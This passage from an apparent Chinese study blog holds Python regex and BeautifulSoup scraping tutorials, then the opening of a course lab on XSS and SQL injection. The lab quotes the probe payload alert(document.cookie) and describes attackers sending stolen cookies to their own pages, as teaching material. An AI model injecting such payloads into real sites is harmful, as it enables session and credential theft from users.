#[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;]#(2) 不区分大小写的匹配res = re.findall(&quot;&lt;a href=\\&quot;http://www\\..*?\\.com\\&quot;&gt;.*?&lt;/a&gt;&quot;,myStr,re.I) #[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;, &#x27;&lt;A href=&quot;http://www.taobao.com&quot;&gt;淘宝&lt;/A&gt;&#x27;]res = re.findall(&quot;&lt;[aA] href=\\&quot;http://www\\..*?\\.com\\&quot;&gt;.*?&lt;/[aA]&gt;&quot;,myStr) #[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;]# (3) 使.支持换行匹配res = re.findall(&quot;&lt;a href=&quot;http://www..?.com&quot;&gt;.?&lt;/a&gt;&quot;,myStr,re.S) ## (4) 支持换行 支持不区分大小写匹配res = re.findall(&quot;&lt;a href=&quot;http://www..?.com&quot;&gt;.?&lt;/a&gt;&quot;,myStr,re.S|re.I) #print(res) 4、finditer()函数 原型 1def finditer(pattern, string, flags=0) 功能 与findall()类似，返回一个迭代器 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 代码 12345678import reres = re.finditer(&#x27;\\w&#x27;, &#x27;12hsakda1&#x27;)print(res)print(next(res))for i in res: print(i) 5、split()函数 作用：切割字符串 原型： 1def split(patter, string, maxsplit=0, flags=0) 参数 pattern 正则表达式 string 要拆分的字符串 maxsplit 最大拆分次数 默认拆分全部 flags 修正符 示例 12345import remyStr = &quot;asdas\\rd&amp;a\\ts12d\\n*a3sd@a_1sd&quot;#通过特殊字符 对其进行拆分 成列表res = re.split(&quot;[^a-z]&quot;,myStr)res = re.split(&quot;\\W&quot;,myStr) 6、修正符 作用 对正则进行修正 使用 search&#x2F;match&#x2F;findall&#x2F;finditer 等函数 flags参数的使用 修正符 re.I 不区分大小写匹配 re.S 使.可以匹配换行符 匹配任意字符 使用 re.I 12print(re.findall(&#x27;[a-z]&#x27;,&#x27;AaBb&#x27;))print(re.findall(&#x27;[a-z]&#x27;,&#x27;AaBb&#x27;, flags=re.I)) re.S 12print(re.findall(&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;,&#x27;&lt;b&gt;b标签&lt;/b&gt;&#x27;))print(re.findall(&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;,&#x27;&lt;b&gt;b标\\n签&lt;/b&gt;&#x27;, flags=re.S)) 四、正则高级1、分组&amp;起名称 概念 处理简单的判断是否匹配之外，正则表达式还有提取子串的功能，用()表示的就是要提取的分组 代码 12345#给当前匹配到的结果起别名s = &#x27;3G4HFD567&#x27;re.match(&quot;(?P&lt;value&gt;\\d+)&quot;,s)print(x.group(0))print(x.group(&#x27;value&#x27;)) 说明 正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来 group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串 2、编译 概念 当在python中使用正则表达式时，re模块会做两件事，一件是编译正则表达式，如果表达式的字符串本身不合法，会报错。另一件是用编译好的正则表达式提取匹配字符串 编译优点 如果一个正则表达式要使用几千遍，每一次都会编译，出于效率的考虑进行正则表达式的编译，就不需要每次都编译了，节省了编译的时间，从而提升效率 compile()函数 原型 1def compile(pattern, flags=0) 作用 将pattern模式编译成正则对象 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) flags 标识位，用于控制正则表达式的匹配方式 flags 值 说明 re.I 是匹配对大小写不敏感 re.S 使.匹配包括换行符在内的所有字符 返回值 编译好的正则对象 示例 1234import rere_phone = re.compile(r&quot;(0\\d&#123;2,3&#125;-\\d&#123;7,8&#125;)&quot;)print(re_phone, type(re_phone)) 编译后其他方法的使用 原型 1234def match(self, string, pos=0, endpos=-1)def search(self, string, pos=0, endpos=-1)def findall(self, string, pos=0, endpos=-1)def finditer(self, string, pos=0, endpos=-1) 参数 参数 说明 string 待匹配的字符串 pos 从string字符串pos下标开始 endpos 结束下标 示例 123456s1 = &quot;lucky&#x27;s phone is 010-88888888&quot;s2 = &quot;kaige&#x27;s phone is 010-99999999&quot;ret1 = re_phone.search(s1)print(ret1, ret1.group(1))ret2 = re_phone.search(s2)print(ret2, ret2.group(1)) 3、贪婪与非贪婪 贪婪模式 贪婪概念：匹配尽可能多的字符 .+ 匹配换行符以外的字符至少一次 .* 匹配换行符以外的字符任意次 实例 12res = re.search(&#x27;&lt;b&gt;.+&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;)res = re.search(&#x27;&lt;b&gt;.*&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;) 非贪婪模式 非贪婪概念：尽可能少的匹配称为非贪婪匹配，*?、+?即可 .+? 匹配换行符以外的字符至少一次 拒绝贪婪 .*? 匹配换行符以外的字符任意次 拒绝贪婪 实例 12res = re.search(&#x27;&lt;b&gt;.+?&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;)res = re.search(&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;) 练习： 中信证券 1# 将产品名称管理人 风险评级 认购金额 起点公示 信息 全部抓到 练习抓取股票 每一行数据 豆瓣 抓取标题和图片img标签","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"BS4","slug":"BS4笔记","date":"2023-12-26T04:51:20.918Z","updated":"2023-12-28T04:51:55.163Z","comments":true,"path":"2023/12/26/BS4笔记/","permalink":"http://example.com/2023/12/26/BS4%E7%AC%94%E8%AE%B0/","excerpt":"","text":"beautifulsoup一、beautifulsoup的简单使用简单来说，Beautiful Soup是python的一个库，最主要的功能是从网页抓取数据。官方解释如下： Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。 1、安装1pip install beautifulsoup4 1.1解析器Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解析器，lxml 解析器更加强大，速度更快，推荐安装。 1pip install lxml 1.2 解析器对比官网文档 2、快速开始下面的一段HTML代码将作为例子被多次用到.这是 爱丽丝梦游仙境的 的一段内容(以后内容中简称为 爱丽丝 的文档): 12345678910111213html_doc = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot; 使用BeautifulSoup解析这段代码,能够得到一个 BeautifulSoup 的对象,并能按照标准的缩进格式的结构输出: 1234from bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc, &#x27;lxml&#x27;)# html进行美化print(soup.prettify()) 匹配代码 123456789101112131415161718192021222324252627282930313233&lt;html&gt; &lt;head&gt; &lt;title&gt; The Dormouse&#x27;s story &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p class=&quot;title&quot;&gt; &lt;b&gt; The Dormouse&#x27;s story &lt;/b&gt; &lt;/p&gt; &lt;p class=&quot;story&quot;&gt; Once upon a time there were three little sisters; and their names were &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt; Elsie &lt;/a&gt; , &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt; Lacie &lt;/a&gt; and &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt; Tillie &lt;/a&gt; ;and they lived at the bottom of a well. &lt;/p&gt; &lt;p class=&quot;story&quot;&gt; ... &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 几个简单的浏览结构化数据的方法: 1234567891011121314151617181920212223242526272829303132soup.title # 获取标签title# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;soup.title.name # 获取标签名称# &#x27;title&#x27;soup.title.string # 获取标签title内的内容# &#x27;The Dormouse&#x27;s story&#x27;soup.title.parent # 获取父级标签soup.title.parent.name # 获取父级标签名称# &#x27;head&#x27;soup.p# &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;soup.p[&#x27;class&#x27;] # 获取p的class属性值# &#x27;title&#x27;soup.a# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;soup.find_all(&#x27;a&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]soup.find(id=&quot;link3&quot;) # 获取id为link3的标签# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt; 从文档中找到所有&lt;a&gt;标签的链接: 12345for link in soup.find_all(&#x27;a&#x27;): print(link.get(&#x27;href&#x27;)) # http://example.com/elsie # http://example.com/lacie # http://example.com/tillie 从文档中获取所有文字内容: 1print(soup.get_text()) 3、如何使用将一段文档传入BeautifulSoup 的构造方法,就能得到一个文档的对象, 可以传入一段字符串或一个文件句柄. 12345from bs4 import BeautifulSoupsoup = BeautifulSoup(open(&quot;index.html&quot;))soup = BeautifulSoup(&quot;&lt;html&gt;data&lt;/html&gt;&quot;, &#x27;lxml&#x27;) 然后,Beautiful Soup选择最合适的解析器来解析这段文档,如果手动指定解析器那么Beautiful Soup会选择指定的解析器来解析文档。 二、beautifulsoup的遍历文档树还拿”爱丽丝梦游仙境”的文档来做例子: 1234567891011121314151617html_doc = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoup# lxml和html.parser解析的有时候会根据html是否完整而有解析不同的问题，需要注意soup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;) 通过这段例子来演示怎样从文档的一段内容找到另一段内容 1、子节点一个Tag可能包含多个字符串或其它的Tag,这些都是这个Tag的子节点.Beautiful Soup提供了许多操作和遍历子节点的属性. 注意: Beautiful Soup中字符串节点不支持这些属性,因为字符串没有子节点。 1.1 .contentstag的 .contents 属性可以将tag的子节点以列表的方式输出: 123456789101112head_tag = soup.headhead_tag# &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;head_tag.contents[&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]title_tag = head_tag.contents[0]title_tag# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;title_tag.contents# [u&#x27;The Dormouse&#x27;s story&#x27;] 字符串没有 .contents 属性,因为字符串没有子节点: 123text = title_tag.contents[0]text.contents# AttributeError: &#x27;NavigableString&#x27; object has no attribute &#x27;contents&#x27; 2、 节点内容2.1 .string如果tag只有一个 NavigableString 类型子节点,那么这个tag可以使用 .string 得到子节点。如果一个tag仅有一个子节点,那么这个tag也可以使用 .string 方法,输出结果与当前唯一子节点的 .string 结果相同。 通俗点说就是：如果一个标签里面没有标签了，那么 .string 就会返回标签里面的内容。如果标签里面只有唯一的一个标签了，那么 .string 也会返回最里面的内容。例如： 12345print (soup.head.string)#The Dormouse&#x27;s story# &lt;title&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/title&gt;print (soup.title.string)#The Dormouse&#x27;s story 如果tag包含了多个子节点,tag就无法确定，string 方法应该调用哪个子节点的内容, .string 的输出结果是 None 12print (soup.html.string)#None 2.2 .text如果tag包含了多个子节点, text则会返回内部所有文本内容 1print (soup.html.text) 注意： strings和text都可以返回所有文本内容 区别：text返回内容为字符串类型 strings为生成器generator 3、 多个内容1.strings .stripped_strings 属性 3.1**.strings**获取多个内容，不过需要遍历获取，比如下面的例子： 1234567891011121314151617181920212223for string in soup.strings: print(repr(string)) &#x27;&#x27;&#x27; &#x27;\\n&#x27;&quot;The Dormouse&#x27;s story&quot;&#x27;\\n&#x27;&#x27;\\n&#x27;&quot;The Dormouse&#x27;s story&quot;&#x27;\\n&#x27;&#x27;Once upon a time there were three little sisters; and their names were\\n&#x27;&#x27;Elsie&#x27;&#x27;,\\n&#x27;&#x27;Lacie&#x27;&#x27; and\\n&#x27;&#x27;Tillie&#x27;&#x27;;\\nand they lived at the bottom of a well.&#x27;&#x27;\\n&#x27;&#x27;...&#x27;&#x27;\\n&#x27; &#x27;&#x27;&#x27; 3.2 .stripped_strings输出的字符串中可能包含了很多空格或空行,使用 .stripped_strings 可以去除多余空白内容 123456789101112131415161718for string in soup.stripped_strings: print(repr(string))&#x27;&#x27;&#x27;&quot;The Dormouse&#x27;s story&quot;&quot;The Dormouse&#x27;s story&quot;&#x27;Once upon a time there were three little sisters; and their names were&#x27;&#x27;Elsie&#x27;&#x27;,&#x27;&#x27;Lacie&#x27;&#x27;and&#x27;&#x27;Tillie&#x27;&#x27;;\\nand they lived at the bottom of a well.&#x27;&#x27;...&#x27;&#x27;&#x27;&#x27; 4、 父节点继续分析文档树,每个tag或字符串都有父节点:被包含在某个tag中 4.1 .parent通过 .parent 属性来获取某个元素的父节点.在例子“爱丽丝”的文档中,&lt;head&gt;标签是&lt;title&gt;标签的父节点: 12345title_tag = soup.titletitle_tag# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;title_tag.parent# &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt; 文档的顶层节点比如&lt;html&gt;的父节点是 BeautifulSoup 对象: 123html_tag = soup.htmltype(html_tag.parent)# &lt;class &#x27;bs4.BeautifulSoup&#x27;&gt; 三、beautifulsoup的搜索文档树1、find_all1find_all( name , attrs , recursive , string , **kwargs ) find_all() 方法搜索当前tag的所有tag子节点,并判断是否符合过滤器的条件: 123456789101112131415161718soup.find_all(&quot;title&quot;)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]soup.find_all(&quot;p&quot;, &quot;title&quot;)# [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;]soup.find_all(&quot;a&quot;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]soup.find_all(id=&quot;link2&quot;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]import re# 模糊查询 包含sisters的就可以soup.find(string=re.compile(&quot;sisters&quot;))# &#x27;Once upon a time there were three little sisters; and their names were\\n&#x27; 有几个方法很相似,还有几个方法是新的,参数中的 string 和 id 是什么含义? 为什么 find_all(&quot;p&quot;, &quot;title&quot;) 返回的是CSS Class为”title”的&lt;p&gt;标签? 我们来仔细看一下 find_all() 的参数. 1.1 name 参数name 参数可以查找所有名字为 name 的tag,字符串对象会被自动忽略掉. 简单的用法如下: 12soup.find_all(&quot;title&quot;)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;] 搜索 name 参数的值可以使任一类型的 过滤器 ,字符串,正则表达式,列表,方法或是 True . &lt;1&gt; 传字符串 最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的标签 12soup.find_all(&#x27;b&#x27;)# [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;] &lt;2&gt; 传正则表达式 如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 match() 来匹配内容.下面例子中找出所有以b开头的标签,这表示&lt;body&gt;和&lt;b&gt;标签都应该被找到 12345import refor tag in soup.find_all(re.compile(&quot;^b&quot;)): print(tag.name)# body# b &lt;3&gt; 传列表 如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有&lt;a&gt;标签和&lt;b&gt;标签 12345soup.find_all([&quot;a&quot;, &quot;b&quot;])# [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] 1.2 keyword 参数如果一个指定名字的参数不是搜索内置的参数名,搜索时会把该参数当作指定名字tag的属性来搜索,如果包含一个名字为 id 的参数,Beautiful Soup会搜索每个tag的”id”属性. 123456789101112soup.find_all(id=&#x27;link2&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]import re# 超链接包含elsie标签print(soup.find_all(href=re.compile(&quot;elsie&quot;)))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]# 以The作为开头的字符串print(soup.find_all(text=re.compile(&quot;^The&quot;))) # [&quot;The Dormouse&#x27;s story&quot;, &quot;The Dormouse&#x27;s story&quot;]# class选择器包含st的节点print(soup.find_all(class_=re.compile(&quot;st&quot;))) 搜索指定名字的属性时可以使用的参数值包括 字符串 , 正则表达式 , 列表, True . 下面的例子在文档树中查找所有包含 id 属性的tag,无论 id 的值是什么: 1234soup.find_all(id=True)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] 使用多个指定名字的参数可以同时过滤tag的多个属性: 12soup.find_all(href=re.compile(&quot;elsie&quot;), id=&#x27;link1&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;three&lt;/a&gt;] 在这里我们想用 class 过滤，不过 class 是 python 的关键词，这怎么办？加个下划线就可以 123456789print(soup.find_all(&quot;a&quot;, class_=&quot;sister&quot;))&#x27;&#x27;&#x27;[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]&#x27;&#x27;&#x27; 通过 find_all() 方法的 attrs 参数定义一个字典参数来搜索包含特殊属性的tag: 12data_soup.find_all(attrs=&#123;&quot;data-foo&quot;: &quot;value&quot;&#125;)# [&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;] 注意：如何查看条件id和class同时存在时的写法 12print(soup.find_all(&#x27;b&#x27;, class_=&quot;story&quot;, id=&quot;x&quot;))print(soup.find_all(&#x27;b&#x27;, attrs=&#123;&quot;class&quot;:&quot;story&quot;, &quot;id&quot;:&quot;x&quot;&#125;)) 1.3 text 参数通过 text 参数可以搜搜文档中的字符串内容.与 name 参数的可选值一样, text 参数接受 字符串 , 正则表达式 , 列表, True 1234567891011import reprint(soup.find_all(text=&quot;Elsie&quot;))# [&#x27;Elsie&#x27;]print(soup.find_all(text=[&quot;Tillie&quot;, &quot;Elsie&quot;, &quot;Lacie&quot;]))# [&#x27;Elsie&#x27;, &#x27;Lacie&#x27;, &#x27;Tillie&#x27;]# 只要包含Dormouse就可以print(soup.find_all(text=re.compile(&quot;Dormouse&quot;)))# [&quot;The Dormouse&#x27;s story&quot;, &quot;The Dormouse&#x27;s story&quot;] 1.4 limit 参数find_all() 方法返回全部的搜索结构,如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 limit 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 limit 的限制时,就停止搜索返回结果. 1234567print(soup.find_all(&quot;a&quot;,limit=2))print(soup.find_all(&quot;a&quot;)[0:2])&#x27;&#x27;&#x27;[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]&#x27;&#x27;&#x27; 2、find()1find( name , attrs , recursive , string , **kwargs ) find_all() 方法将返回文档中符合条件的所有tag,尽管有时候我们只想得到一个结果.比如文档中只有一个&lt;body&gt;标签,那么使用 find_all() 方法来查找&lt;body&gt;标签就不太合适, 使用 find_all 方法并设置 limit=1 参数不如直接使用 find() 方法.下面两行代码是等价的: 12345soup.find_all(&#x27;title&#x27;, limit=1)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]soup.find(&#x27;title&#x27;)# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt; 唯一的区别是 find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果. find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None . 12print(soup.find(&quot;nosuchtag&quot;))# None soup.head.title 是 tag的名字 方法的简写.这个简写的原理就是多次调用当前tag的 find() 方法: 12345soup.head.title# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;soup.find(&quot;head&quot;).find(&quot;title&quot;)# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt; 四、beautifulsoup的css选择器我们在写 CSS 时，标签名不加任何修饰，类名前加点，id名前加 #，在这里我们也可以利用类似的方法来筛选元素，用到的方法是 soup.select()，返回类型是 list 1、通过标签名查找12print(soup.select(&quot;title&quot;)) #[&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]print(soup.select(&quot;b&quot;)) #[&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;] 2、通过类名查找12345678print(soup.select(&quot;.sister&quot;)) &#x27;&#x27;&#x27;[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]&#x27;&#x27;&#x27; 3、id名查找12print(soup.select(&quot;#link1&quot;))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;] 4、组合查找组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开 123print(soup.select(&quot;p #link2&quot;))#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;] 直接子标签查找 12print(soup.select(&quot;p &gt; #link2&quot;))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;] 查找既有class也有id选择器的标签 1a_string = soup.select(&quot;.story#test&quot;) 查找有多个class选择器的标签 1a_string = soup.select(&quot;.story.test&quot;) 查找有多个class选择器和一个id选择器的标签 1a_string = soup.select(&quot;.story.test#book&quot;) 5、属性查找查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。 12print(soup.select(&quot;a[href=&#x27;http://example.com/tillie&#x27;]&quot;))#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容： 12345678for title in soup.select(&#x27;a&#x27;): print (title.get_text())&#x27;&#x27;&#x27;ElsieLacieTillie&#x27;&#x27;&#x27;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"实验三 XSS和SQL注入","slug":"实验三XSS和SQL注入","date":"2023-12-24T09:34:29.165Z","updated":"2023-12-31T05:11:22.844Z","comments":true,"path":"2023/12/24/实验三XSS和SQL注入/","permalink":"http://example.com/2023/12/24/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"实验三 XSS和SQL注入实验目的和要求实验目的：了解什么是XSS；了解XSS攻击实施，理解防御XSS攻击的方法；了解SQL注入的基本原理；掌握PHP脚本访问MySQL数据库的基本方法；掌握程序设计中避免出现SQL注入漏洞的基本方法；掌握网站配置。 系统环境：Kali Linux 2、Windows Server 网络环境：交换网络结构 实验工具： Beef；AWVS(Acunetix Web Vulnarability Scanner);SqlMAP；DVWA 实验原理： XSS 1、什么是XSS XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 2 、什么是XSS攻击 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 3、 什么是Cookie Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 